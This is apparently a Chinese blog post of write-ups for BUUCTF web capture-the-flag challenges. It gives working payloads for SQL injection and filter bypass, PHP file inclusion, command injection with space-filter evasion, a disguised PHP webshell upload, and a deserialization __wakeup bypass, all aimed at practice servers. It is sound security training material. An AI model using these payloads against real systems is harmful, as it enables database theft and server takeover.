---
title: buuctf_web部分刷题记录_PART1
description: 我是菜鸡
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
abbrlink: '2e610037'
date: 2022-10-12 19:51:59
typora-root-url: ..
---



# [极客大挑战 2019]EasySQL

简单的SQL注入:

尝试在用户名栏输入`admin'`提示SQL语句报错，说明存在注入漏洞

那么在用户名栏输入

```
admin' or '1'='1' #
```

这里`'1'='1'`是一个恒真的条件, `#`使得后面的其他语句失效

密码随便输入一个,点击登录后就能够看到flag了

<img src="/images/buuctf-web/image-20221012200717515-16670478197331.png" alt="image-20221012200717515" style="zoom:67%;" />

<br>

***

<br>

# [HCTF_2018]WarmUp

打开页面是一个滑稽脸,查看源码可以发现`source.php`

访问这个文件,得到

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];//白名单
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
            if (in_array($page, $whitelist)) {
                return true;
            }
            $_page = mb_substr( //返回给定字符串的一部分,0是起始位置,第三个参数是返回的长度
                $page,
                0,
                mb_strpos($page . '?', '?')//此函数返回问号在page中第一次出现的位置
            );// 此函数相当于截断了$_page中问号后面的部分
            if (in_array($_page, $whitelist)) {
                return true;
            }
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            ); 
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file'])&& is_string($_REQUEST['file'])&& emmm::checkFile($_REQUEST['file'])) 	{ // 要求参数file的值非空, 是字符串,且通过checkFile函数的检测
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

访问一下代码里提示的另一个文件 `hint.php`, 提示flag在`ffffllllaaaagggg`中

<img src="/images/buuctf-web/2.png" alt="2" style="zoom:67%;" />

代码中,第8行的第一个`if`判断是否传入参数,以及参数值是否是字符串

12行第二个`if`直接判断参数值是否在白名单里,如果传`file=hint.php`这里将会直接判断为True,函数返回,并`include`参数值,但是这样无法读取到`ffffllllaaaagggg`中的内容

15-18行截断了参数值第一个问号前面的部分, 20行将对这部分进行判断,如果在白名单内,函数也会返回.

如果想让函数在这里返回,那么参数`file`的值应为: `hint.php?其他内容`

>**知识点补充:**
>
>**对于`include`函数来说,如果它的参数中含有路径,那么它会按照参数给出的路径去寻找文件,也就是会包含最后一个`/`后面的文件**
>
>**例如`include(hint.php?../../abc.php)`即使`hint.php`存在,`include`函数也会去尝试寻找并包含最后面的`abc.php`**

因此,可以构造payload: 不知道`ffffllllaaaagggg`在哪个目录,依次尝试就行,最后成功的payload:

```
?file=hint.php?../../../../../ffffllllaaaagggg
```

这里`hint.php`保证能够通过检测, 最后执行的include为,也就成功包含了`ffffllllaaaagggg`

```
include(hint.php?../../../../../ffffllllaaaagggg)
```

<img src="/images/buuctf-web/image-20221012223735123.png" alt="image-20221012223735123" style="zoom:67%;" />



<br>

***

<br>

# [极客大挑战 2019]Havefun

很简单,查看源码就有提示

GET传一个`cat`参数,值为dog,flag就直接出来了

<br>

***

<br>

# [ACTF2020 新生赛]Include

进来之后是一个链接,点击后发现使用GET中的`file`变量来包含了`flag.php`

直接访问`flag.php`也是显示一样的内容: 

<img src="/images/buuctf-web/image-20221013151927649.png" alt="image-20221013151927649" style="zoom:67%;" />

说明这里存在文件包含漏洞,那么可以利用`php`伪协议来输出一下`flag.php`的源码:

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

将输出内容进行`base64`解码之后就得到了flag:

<img src="/images/buuctf-web/image-20221013152041727-16670478197333.png" alt="image-20221013152041727" style="zoom:67%;" />



<br>

***

<br>

# [ACTF2020 新生赛]Exec

这里输入一个地址,后台服务器会`ping`这个地址,那么后台应该是把这里输入的地址拼接到命令中,那么这里应该也可以利用`&`或`&&`执行其他命令

![image-20221013153002942](/images/buuctf-web/image-20221013153002942.png)

查看下根目录有什么文件:

```
127.0.0.1&ls /
```

要素察觉<img src="/images/buuctf-web/image-20221013153511483-16670478197332.png" alt="image-20221013153511483" style="zoom:67%;" />

接下来输出一下这个文件的内容就看到flag了

```
127.0.0.1&cat  /flag
```

<br>

***

<br>

# [强网杯 2019]随便注

```
select * from `1919810931114514`
73656c656374202a2066726f6d20603139313938313039333131313435313460

1';Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#
```

首先测试

```
1' or '1'='1
```

成功输出

接下来使用`union`来尝试获得数据库的一些信息:

```
1' and '1'='2' union select version(),database() #
```

发现存在关键词过滤:

<img src="/images/buuctf-web/image-20221013154743257.png" alt="image-20221013154743257" style="zoom:67%;" />

那么尝试使用不在黑名单里的`show`来爆库名,表名和列名:

```
1';show databases;#
1';show tables;#
1'; show columns from words;#
1'; show columns from `1919810931114514`;#
```

<img src="/images/buuctf-web/image-20221013155532680-16670478197334.png" alt="image-20221013155532680" style="zoom:67%;" />



<img src="/images/buuctf-web/image-20221013155832825.png" alt="image-20221013155832825" style="zoom:67%;" />

>**知识点:**
>
>**在表名为纯数字时,需要把表名用反引号包裹起来!!!!!**

发现在名为`1919810931114514`的表中有一个名为flag的列,那么现在需要尝试获取这个列中的数据

下面是网上找到大佬使用的几种方法:

- **预处理查询语句**

```
1';Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#
//这里先将本来想要执行的select * from `1919810931114514`进行16进制编码
//然后使用Set语句将编码后的语句赋值给一个变量: Set@变量名=变量值
//使用prepare语句对查询语句进行预处理,这个过程里会进行编码转换:prepare 预处理后的变量名 from @变量名
//最后执行预处理后的语句:execute 预处理后的变量名
```

<img src="/images/buuctf-web/image-20221013171514886-16670478197335.png" alt="image-20221013171514886" style="zoom:67%;" />

<br>

- **使用`handler`语句** 关于`handler`具体见[这里](94662ad7.html)

```
1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;# 
//或者
1';HANDLER `1919810931114514` OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;# 
//这里的逻辑是使用handler语句打开要查询的表,然后读取第一行数据后关闭
```

- **修改表名**

通过前面的查询,库中一共有`word`和`1919810931114514`,`word`表中包含`id`和`data`两列,那么正常输入数字查询出的数据应该来自这个表,那么可以设法使正常查询显示`1919810931114514`这个表中的内容.

如果正常的查询语句为`select id,data from word where id=xxx`,那么只需要让此语句指向另一个表中需要的数据就行了

1. 通过`rename`修改`word`的表名:`rename table words to aaa;`

2. 将`1919810931114514`的表名修改为`word`:

   ```sql
   rename table `1919810931114514` to words
   ```

3. 修改该表中的列信息:

   ```sql
   alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);
   ```

那么完整的payload为:

```
1'; rename table words to aaa; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
```

最后只要输入1就可以查询到flag了:

<img src="/images/buuctf-web/image-20221013175155502-16670478197338.png" alt="image-20221013175155502" style="zoom:67%;" />



<br>

***

<br>

# [SUCTF 2019]EasySQL



```
1 有显示
1' 无显示
1122 and 1=1 # --nonono
asb and 1=1 # --nonono
1122 or 1=1 # --nonono
asb or 1=1 # --nonono
1;show databases;# 成功
1;show tables;# 成功
1;show columns from Flag; --nonono
1;Set@a=0x73686f7720636f6c756d6e732066726f6d20466c61673b;prepare b from @a;execute b;# --nonono
1;HANDLER flag OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;#  --nonono
```

<img src="/images/buuctf-web/image-20221013180118069-16670478197336.png" alt="image-20221013180118069" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221013184312188-16670478197337.png" alt="image-20221013184312188" style="zoom:67%;" />

经过测试可知: 数字型参数, 存在关键词过滤, flag大概率在`Flag`表里,但`Flag`在黑名单里面无法通过过滤

用BurpSuite的`Intruder`做一下`fuzz`测试,看看哪些字符不在过滤范围内,这里长度为507的说明服务器返回了`nonono`,也就是这些词被过滤了

<img src="/images/buuctf-web/image-20221013185406308-16670478197339.png" alt="image-20221013185406308" style="zoom:67%;" />



通过测试, `#`,`;`等符号都还可以使用

另外发现,这里不管查询多大的数字,都会且仅会返回`Array ([0] =>1)`

根据https://blog.csdn.net/mochu7777777/article/details/108937396 这里应该是进行了一次或运算

那么查询语句应该是:

```
$sql = "select ".$post['query']."||flag from Flag";
```

用户提交的参数和flag进行了一次或运算后再执行查询,这样无论提交什么非0数字,实际上执行的查询就是:

```sql
select 1 from Flag;
```

返回的结果自然为1

<img src="/images/buuctf-web/image-20221013194904850.png" alt="image-20221013194904850" style="zoom:67%;" />



那么payload设置为: `*,1`就可以查询到flag,这样实际执行的查询语句是:

```
select *,1 from Flag; 
```

另: 可以通过修改SQL配置,将`||`设置为连接符,当将`||`视为连接符之后,执行下面的语句将分别查询`1`和`flag`

```
select 1||flag from Flag; 
```

那么payload为:

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
实际执行的语句为:
select 1;
set sql_mode=PIPES_AS_CONCAT;
select 1||flag from Flag;
```

<br>

***

<br>

# [GXYCTF2019]Ping Ping Ping

<img src="/images/buuctf-web/image-20221013203635206.png" alt="image-20221013203635206" style="zoom:67%;" />

打开网页只有这么几个字符,可能是提示在url里带上参数`ip`

<img src="/images/buuctf-web/image-20221013203740321-166704781973310.png" alt="image-20221013203740321" style="zoom:67%;" />

那么就用命令注入的思路先尝试一下执行多条命令:

```
?ip=127.0.0.1;ls
```

<img src="/images/buuctf-web/image-20221013203834440-166704781973311.png" alt="image-20221013203834440" style="zoom:67%;" />

下面尝试用`cat flag.php`来读取:

<img src="/images/buuctf-web/image-20221013203934482-166704781973412.png" alt="image-20221013203934482" style="zoom:67%;" />

空格应该是被过滤了...

那么尝试一些**空格的代替选项:**

```
$IFS、${IFS}、$IFS$9、%09（在URL上使用较多）、<、>、<>、{,}、%20(space)、%09(tab)
```

```
?ip=127.0.0.1;cat$IFSflag.php
```

结果..

<img src="/images/buuctf-web/image-20221013204255136-166704781973413.png" alt="image-20221013204255136" style="zoom:67%;" />

无奈,看一下另一个文件`index.php`吧,结果输出了源码,这里可以看到具体过滤了哪些字符

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}
?>
```

这样就要考虑绕过方法了

- **payload1: 通过`base64`编码执行命令:**

```
?ip=127.0.0.1;echo$IFSY2F0IGZsYWcucGhwCg==|base64$IFS-d|sh
这里实际上执行的命令是:
IFSY2F0IGZsYWcucGhwCg== 是base64编码后的cat flag.php
echo IFSY2F0IGZsYWcucGhwCg== 输出结果作为 base -d的输入,进行解码
然后将上面解码的结果再作为sh的输入,也就是作为命令执行cat flag.php
```



- **payload2:内联执行命令:**

>**反引号再linux中能够使前面的命令执行它内部命令的输出结果,即:**
>
>```shell
>cat `ls`
>```
>
>若`ls`的执行结果为111.txt,则上面的命令相当于执行`cat 111.txt`

所以,payload:

```
?ip=127.0.0.1;cat$IFS`ls`
```

- **payload3:变量拼接绕过**

```
?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php
给变量a赋值'g',然后拼接到最终执行的命令里来绕过过滤.
```

flag在源码里:

<img src="/images/buuctf-web/image-20221013204757970-166704781973414.png" alt="image-20221013204757970" style="zoom:67%;" />





<br>

***

<br>

# [极客大挑战 2019]Secret File

进去先看源码,发现一个链接:`Archive_room.php`,进去继续看源码,发现`action.php`

继续点进去,结果直接跳过`action.php`到了`end.php`

这里抓下包看看`action.php`的响应包:

<img src="/images/buuctf-web/image-20221013210413117-166704781973415.png" alt="image-20221013210413117" style="zoom:67%;" />

访问这个`secr3t.php`看到源码: 文件包含

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

那么先尝试包含`flag.php`

```
?file=flag.php
```

并不在这里

<img src="/images/buuctf-web/image-20221013211456760.png" alt="image-20221013211456760" style="zoom:67%;" />

使用php伪协议读取`flag.php`的源码,得到flag

校园网就爆502,热点就可以,这是啥问题........

```
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

<img src="/images/buuctf-web/image-20221014161343528-166704781973416.png" alt="image-20221014161343528" style="zoom:67%;" />

<br>

***

<br>

# [极客大挑战 2019]LoveSQL

进来先试试万能密码:

```
1' or '1'='1'#
```

<img src="/images/buuctf-web/image-20221014181006054-166704781973417.png" alt="image-20221014181006054" style="zoom:67%;" />

成功登录了,不过这些信息也没什么用

接下来用`union`查询来爆一下数据库信息

```
31cae64d3b82c584b7611bf737473952' union select version(),database()#
```

<img src="/images/buuctf-web/image-20221014152047891-166704781973418.png" alt="image-20221014152047891" style="zoom:67%;" />

出错了,需要添加占位列,不确定位置的话就都尝试一下好了

```
1' union select 1,version(),database()#
```

<img src="/images/buuctf-web/image-20221014152122462-166704781973419.png" alt="image-20221014152122462" style="zoom:67%;" />

成功,说明有结果有三列,后两列会回显.

那么后面就简单了,接下来爆表名:

```
1' union select 1,2,group_concat(TABLE_NAME) from information_schema.tables where table_schema=database() limit 0,1#
```

<img src="/images/buuctf-web/image-20221014180215987-166704781973420.png" alt="image-20221014180215987" style="zoom:67%;" />

发现有两个表,名字分别为:`geekuser`和`l0ve1ysq1` 显然第二个比较可疑,爆一下列名:

```
1' union select 1,2,group_concat(COLUMN_NAME) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1' limit 0,1#
```

<img src="/images/buuctf-web/image-20221014180511642-166704781973421.png" alt="image-20221014180511642" style="zoom:67%;" />



```
1' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 limit 0,1#
```

<img src="/images/buuctf-web/image-20221014180852303-166704781973422.png" alt="image-20221014180852303" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221014180904238-166704781973423.png" alt="image-20221014180904238" style="zoom:67%;" />



<br>

***

<br>

# [极客大挑战 2019]Knife

真就白给shell,根据提示直接POST给`Syn`这个变量传值执行命令就行了

扫描一下当前目录并输出,看到一个`index.php`

```
Syc=print_r(scandir("."));
```

<img src="/images/buuctf-web/image-20221014183934877-166704781973424.png" alt="image-20221014183934877" style="zoom:67%;" />

输出一下`index.php`的源码:

```
Syc=show_source("index.php");
```

<img src="/images/buuctf-web/image-20221014184051797-166704781973425.png" alt="image-20221014184051797" style="zoom:67%;" />

扫一下根目录,发现有个名为flag的文件,通过系统命令输出其内容就看到了flag

```
Syc=print_r(scandir("/"));
Syc=system("cat /flag");
```

<img src="/images/buuctf-web/image-20221014184350220-166704781973426.png" alt="image-20221014184350220" style="zoom:67%;" />



这题也可以拿菜刀之类的软件连一下`Syn`这个变量,找得会更快.

<br>

***

<br>

# [极客大挑战 2019]Http

在源码里能找到`Secret.php`,访问之:

<img src="/images/buuctf-web/image-20221014185328220-166704781973427.png" alt="image-20221014185328220" style="zoom:67%;" />

```
It doesn't come from 'https://Sycsecret.buuoj.cn'
```

这里根据提示,可以在请求中添加`Referer`头字段,这个字段用于告知服务器用户是从哪个字段来的:

```
Referer: https://Sycsecret.buuoj.cn
```

发送请求后又提示,请使用`Syclover`浏览器,那么修改`User-Agent`字段就行:

<img src="/images/buuctf-web/image-20221014190838466-166704781973428.png" alt="image-20221014190838466" style="zoom:67%;" />

直接在划线处用`Syclover`替换了`Firefox`

发送请求后提示:「No!!! you can only read this locally!!!」

那么需要添加`X-Forwarded-For(XFF)`头: 

```
X-Forwarded-For: 127.0.0.1
```

<img src="/images/buuctf-web/image-20221014191033879.png" alt="image-20221014191033879" style="zoom:80%;" />

拿到flag

<img src="/images/buuctf-web/image-20221014190605829-166704781973429.png" alt="image-20221014190605829" style="zoom:67%;" />



<br>

***

<br>



# [极客大挑战 2019]Upload

提示要求上传图片,那么如果要传一句话木马的话肯定得绕过图片检测

简单改文件扩展名不管用,应该是使用了`getimagesize`这样的函数对文件内容进行了检测

<img src="/images/buuctf-web/image-20221014210751046-166704781973431.png" alt="image-20221014210751046" style="zoom:67%;" />

另外,文件内容中包含`?>`这样的符号也会被检测出来

<img src="/images/buuctf-web/image-20221014211253339-166704781973430.png" alt="image-20221014211253339" style="zoom:67%;" />

因此在编写一句话木马时也需要做一些绕过措施

>补充知识点: **GIF89a头文件欺骗**
>
>假如某个文件的内容为:
>
>```html
>GIF89a
><script language="php">eval($_POST['a']);</script>
>```
>
>**后台在读取文件内容时会认为此文件为图片,这样能够骗过`getimagesize`的检测**

如此以来,搞定了文件内容,就可以看一看哪些文件扩展名能够上传成功了

尝试一下`phtml`,`pht`,`php3`,`php4`,`php5`等,这些扩展名都能够被服务器当作`php`来执行

<img src="/images/buuctf-web/image-20221014210547256-166704781973432.png" alt="image-20221014210547256" style="zoom:67%;" />

另外,直接文件扩展名改为`gif`也能够上传成功

用菜刀尝试连一下`http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/112.phtml`报404,说明上传文件不存放在这个目录, 尝试一下`http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload`这个目录,竟然猜中了:

<img src="/images/buuctf-web/image-20221014212101985-166704781973433.png" alt="image-20221014212101985" style="zoom:67%;" />



这样用菜刀连上就好了:

```
http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload/112.phtml
```

在根目录里找到了flag

另外还找到了检测上传文件脚本的源码:

```php
<?php
$file = $_FILES["file"];

// 允许上传的图片后缀
$allowedExts = array("php","php2","php3","php4","php5","pht","phtm"); //过滤php文件,这里漏了phtml
$temp = explode(".", $file["name"]);
$extension = strtolower(end($temp));        // 获取文件后缀名
$image_type = @exif_imagetype($file["tmp_name"]); //获取图片exif信息,也就根据内容检测了文件是否为图片
if ((($file["type"] == "image/gif")
|| ($file["type"] == "image/jpeg")
|| ($file["type"] == "image/jpg")
|| ($file["type"] == "image/pjpeg")
|| ($file["type"] == "image/x-png")
|| ($file["type"] == "image/png")) //允许的文件格式
&&$file["size"] < 20480)    // 小于 20 kb //限制上传文件的大小
{
    if ($file["error"] > 0){

        echo "ERROR!!!";
    }
    elseif (in_array($extension, $allowedExts)) {
        echo "NOT！".$extension."!";
    }  
    elseif (mb_strpos(file_get_contents($file["tmp_name"]), "<?") !== FALSE) {
        echo "NO! HACKER! your file included '&#x3C;&#x3F;'";
    } //检测文件内容中是否有非法字符
    elseif (!$image_type) {
        echo "Don't lie to me, it's not image at all!!!";
    }
    else{
        $fileName='./upload/'.$file['name'];
        move_uploaded_file($file['tmp_name'],$fileName); 
        echo "上传文件名: " . $file["name"] . "<br>";
    }
}
else
{
    echo "Not image!";
}
?>
```



<br>

***

<br>

# [ACTF2020 新生赛]Upload

还是上传文件,要求只上传jpg,png,gif格式的

如果上传了其他格式的,直接就会在前端弹窗,弹窗时都没有抓到包,这里的检测应该发生在前端

<img src="/images/buuctf-web/image-20221014215427308-166704781973435.png" alt="image-20221014215427308" style="zoom: 67%;" />

<img src="/images/buuctf-web/image-20221014214036126.png" alt="image-20221014214036126" style="zoom:67%;" />

那么可以先上传后缀名符合要求的`jpg,png,gif`图片,然后修改包中的文件后缀名为`phtml`(经过尝试,`php`会被后端过滤出来,尝试了一圈还是只能用`phtml`)

<img src="/images/buuctf-web/image-20221014214913199-166704781973434.png" alt="image-20221014214913199" style="zoom:67%;" />

上传成功,这里还很贴心地给了路径,那么使用菜刀连接就能找到flag了.

<img src="/images/buuctf-web/image-20221014214944504-166704781973436.png" alt="image-20221014214944504" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221014215043655-166704781973437.png" alt="image-20221014215043655" style="zoom:67%;" />



<br>

***

<br>



# [极客大挑战 2019]BabySQL

万能密码不能用了

![image-20221014222541901](/image/buuctf-web/image-20221014222541901.png)<img src="/images/buuctf-web/image-20221014222541901.png" alt="image-20221014222541901" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222258099-166704781973438.png" alt="image-20221014222258099" style="zoom:67%;" />

但是密码框直接输入`1'`会报错,说明还是存在注入漏洞

<img src="/images/buuctf-web/image-20221014222358093-166704781973439.png" alt="image-20221014222358093" style="zoom:67%;" />

尝试`union select`,依然报错,根据前面输入`1'`和`1' or '1'='1'#`的对比,这里应该是存在关键词过滤

这里对`or`尝试一下双写绕过: 成功,果然如此

<img src="/images/buuctf-web/image-20221014222633460-166704781973440.png" alt="image-20221014222633460" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222649635.png" alt="image-20221014222649635" style="zoom:67%;" />

那么对`union`和`select`使用同样的方法来绕过:

```
1' ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom information_schema.tables whwhereere table_schema=database()#
```

<img src="/images/buuctf-web/image-20221014221556384.png" alt="image-20221014221556384" style="zoom:67%;" />

这里`imformation`中的`or`也被过滤了...

```
1' ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#
```

<img src="/images/buuctf-web/image-20221014221726604-166704781973442.png" alt="image-20221014221726604" style="zoom:67%;" />

后面用常规方法一步一步找到flag就好了:

```
1' ununionion seselectlect 1,2,group_concat(COLUMN_NAME) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql'#
```

<img src="/images/buuctf-web/image-20221014221925750-166704781973443.png" alt="image-20221014221925750" style="zoom:67%;" />

```
1' ununionion seselectlect 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#
```

<img src="/images/buuctf-web/image-20221014222131054-166704781973444.png" alt="image-20221014222131054" style="zoom:67%;" />

<br>

***

<br>

# [极客大挑战 2019]PHP

进去啥都找不到,先拿`dirsearch`工具扫一下网站目录:

```
py dirsearch.py -u "http://725eb650-f8d1-40ae-b65d-7e2f77fe5288.node4.buuoj.cn:81" -e php
```

扫到一个`www.zip`,访问下载之,得到源码文件

反序列化漏洞

`index.php`和`flag.php`

```php
//
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
////
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>
```

`class.php`:

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();            
        }
    }
}
?>
```

可以看到,这里需要在访问`index.php`的时候(也就是打开题目的那个页面),用GET传一个`select`字符串,这个字符串会被反序列化为对象

`index.php`包含了`class.php`,而在`class.php`中定义了一个名为`Name`的类,其中还包含了若干魔术方法

其中,在`__destruct`方法中(对象被销毁时调用,执行`unserialize`时也会调用此方法),如果`username`的值为`admin`,且`password`的值为100,就会打印flag

因此按照要求构建`select`字符串就可以了

**快速构建字符串,直接把类以及序列化的相关代码拿到本地来执行,生成符合要求的字符串:**

```php
<?php
    class Name{
        private $username = 'nonono';
        private $password = 'yesyes';

        public function __construct($username,$password){
            $this->username = $username;
            $this->password = $password;
        }
    }
    $a = new Name('admin', 100);
    var_dump(serialize($a));
?>
```

上面的代码输出字符串:

```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

但目前的问题是,执行反序列化时相当于生成了一个对象,因此会调用`__wakeup`方法,此方法会将`username`的值修改为`guest`

那么现在就需要设法绕过`__wakeup`方法来执行反序列化:

当成员属性数量和实际的属性数量不一致的时候,可以绕过`__wakeup方法`,所以这里把属性数从2改为3

```
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

但执行了之后发现反序列化并没有成功,这里`__construct`都没有被调用

<img src="/images/buuctf-web/image-20221015184358169-166704781973445.png" alt="image-20221015184358169" style="zoom:67%;" />

> **这里补充知识点:**
>
> **在序列化`serialize`时, 对于`private`属性,生成字符串中的属性名表现为「类名+属性名」,也就像上面的`Nameusername`**
>
> **但是其实在类名的两侧还各有一个空字节,但是当复制这个字符串并直接执行反序列化的时候,这个空字节并不会被带上,反序列化函数执行时发现格式出现了错误,因此也就导致了反序列化生成对象失败**
>
> **因此这里构建被反序列化的字符串时,需要人工在类名的两端各加上一个`%00`**

如此以来,payload为:

```
select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

提交后获得flag

关于反序列化详细可见[unserialize](fd61bb58.html)

<br>

***

<br>



# [ACTF2020 新生赛]BackupFile

进去之后啥也没有<img src="/images/buuctf-web/image-20221015212828444.png" alt="image-20221015212828444" style="zoom:67%;" />



拿`dirsearch`扫一下:(这里指定了一下请求延时,因为频繁出429可能是因为网站有防扫限制)

```
py dirsearch.py -u "http://60994b4a-a1d4-49fb-91dc-a26b5c7a2bd1.node4.buuoj.cn:81/" -e php --delay=2
```

<img src="/images/buuctf-web/image-20221015213020368-166704781973447.png" alt="image-20221015213020368" style="zoom:67%;" />



扫到一个`index.php.bak`,访问下载它,打开之后发现是源码:

```php
<?php
include_once "flag.php";
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

根据源码逻辑, 需要GET传参数`key`, 必须是数字,且`intval`取整之后要等于字符串`str`的值:

这里的漏洞是`==`为弱相等,不检测数据类型,只要值相等就会返回`TRUE`

并且,如果比较的一边为数字,一边为字符串,那么比较时如果字符串的开头有数字,那么会将这段数字的值作为字符串的值,直到遇到第一个字母,如果字符串的开头不是数字,那么将把字符串视为数字0.

那么这里的字符串就会被视为`123`,所以`key`的值传123即可

<br>

***

<br>

# [RoarCTF 2019]Easy Calc

进来发现是一个计算器,查看源码:

```javascript
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```

这里注意到有一个`calc.php`,尝试访问发现直接返回了源码:

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__); //如果没传num,将直接打印源码
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
    //黑名单过滤符号
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';'); //可利用
}
?> 
```

这里给`num`传命令的话会被组织,应该是有防火墙:

<img src="/images/buuctf-web/image-20221015221127741-166704781973446.png" alt="image-20221015221127741" style="zoom:67%;" />

这里可以利用**php的字符串解析特性**

>php在将参数解析为变量时,会:
>
>- 去除开头的空白字符
>- 将一些非法字符转换为下划线
>
>那么,如果防火墙会对GET传的参数`num`进行检测,那么再传参的时候只需要在`num`前面加上一个空格,传 `? num=...`即可,因为对防火墙来说,它要检查的变量是`num`,而这里的变量是` num`. 而对php来说,即使前面加了一个空格,它仍会将此变量解析为`num`

利用此漏洞成功执行命令:<img src="/images/buuctf-web/image-20221015221731309-166704781973448.png" alt="image-20221015221731309" style="zoom:67%;" />

这里因为过滤了好多符号,需要**进行无参数的RCE**

```
? num=Print_r(scandir(dirname(dirname(dirname(getcwd())))))
这里getcwd返回当前目录的绝对路径
dirname函数返回上级目录的绝对路径
```

先尝试扫描一下目录,找找flag文件在什么地方

<img src="/images/buuctf-web/image-20221015223408729.png" alt="image-20221015223408729" style="zoom:80%;" />

那么需要想办法读取该文件: **可以利用`chr`函数将`ascii`码转为需要的字符**

```php
show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) //这些ascii码拼接起来就是
```



另一种方法: 可以在GET中引入其他不被过滤的参数来执行命令

- `get_defined_vars()`返回由所有已定义变量所组成的数组

<img src="/images/buuctf-web/image-20221015225417058-166704781973449.png" alt="image-20221015225417058" style="zoom:67%;" />

可以看到,GET数组是其中的第一个,所以进一步,用`current()`函数取到GET数组:

<img src="/images/buuctf-web/image-20221015225518264-166704781973450.png" alt="image-20221015225518264" style="zoom:67%;" />



那么在GET时多传一个参数,也将出现在这个数组里:

<img src="/images/buuctf-web/image-20221015225601337-166704781973451.png" alt="image-20221015225601337" style="zoom:67%;" />

进一步通过`end()`函数来取到这个新添加的参数

